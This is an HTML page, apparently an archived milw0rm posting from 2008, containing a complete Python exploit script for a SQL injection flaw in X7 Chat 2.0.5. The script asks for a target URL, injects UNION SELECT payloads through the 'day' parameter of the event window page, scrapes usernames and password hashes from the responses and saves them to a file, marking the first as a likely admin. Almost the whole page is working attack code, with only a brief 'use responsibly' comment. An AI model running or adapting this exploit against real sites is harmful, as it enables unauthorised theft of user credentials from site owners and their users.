<html><head><title>X7 Chat <= 2.0.5 (day) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/python
#
#Exploit for xchat 2.0.5
#Saca los usuarios y los hash
#By nonroot - 2008
#it's a PoC, please use responsibly
#
import string,urllib
import sys,re
print &quot;Target host: i.e: http://127.0.0.1/x7chat/&quot;
host=raw_input(&quot;Target host ( include http and /): &quot;)
print &quot;Output file: i.e: salida.txt&quot;
out_file=raw_input(&quot;Output file: &quot;)
print &quot;trying ...&quot;
SQL_users=&quot;1%20UNION%20select%20username,id,username%20from%20x7chat2_users%20--&quot;
SQL_hashs=&quot;1%20UNION%20select%20username,id,password%20from%20x7chat2_users%20--&quot;
link_attack=host+&quot;index.php?act=sm_window&amp;page=event&amp;day=&quot;
response = urllib.urlopen(link_attack + SQL_users).read()
findall_users=re.compile(&quot;&lt;/b&gt;(\w+)&lt;Br&gt;&lt;Br&gt;&quot;).findall
found_users=findall_users(response)
if len(found_users)==0:
	print &quot;Sorry, exploit failed, please review the SQL string and try to change something like tables or wathever&quot;
	print &quot;Or, there are not users, or x7chat software is version &gt;= 2.0.5.1, so sorry. try to find a new bug ;)&quot;
	sys.exit()
#Find the hashs
response = urllib.urlopen(link_attack + SQL_hashs).read()
findall_hashs=re.compile(&quot;&lt;/b&gt;(\w+)&lt;Br&gt;&lt;Br&gt;&quot;).findall
found_hashs=findall_hashs(response)
if len(found_hashs)==0:
	print &quot;Sorry, exploit failed, please review the SQL string and try to change something like tables or wathever&quot;
	print &quot;Or, there are not hashs, or x7chat software is version &gt;= 2.0.5.1, so sorry. try to find a new bug ;)&quot;
	sys.exit()
#Save all this at file
file = open(out_file, &quot;w&quot;)
file.write(&quot;*********************************************************************\n&quot;)
file.write(&quot;\n&quot;)
file.write(&quot;HOST:&quot;)
file.write(&quot;	&quot;)
file.write(host)
file.write(&quot;\n&quot;)
file.write(&quot;\n&quot;)
file.write(&quot;USER						HASH\n&quot;)
file.write(&quot;possible admin user: &quot;)
file.write(found_users[0])
file.write(&quot;			&quot;)
file.write(found_hashs[0])
file.write(&quot;\n&quot;)
for i in range(len(found_users)):
	file.write(found_users[i])
	file.write(&quot;		 				&quot;)
	file.write(found_hashs[i])
	file.write(&quot;\n&quot;)
file.write(&quot;\n&quot;)
file.write(&quot;*********************************************************************\n&quot;)
file.close()
print &quot;Successfull, please review the &quot;,out_file,&quot; file.&quot;

# milw0rm.com [2008-01-14]</pre></html>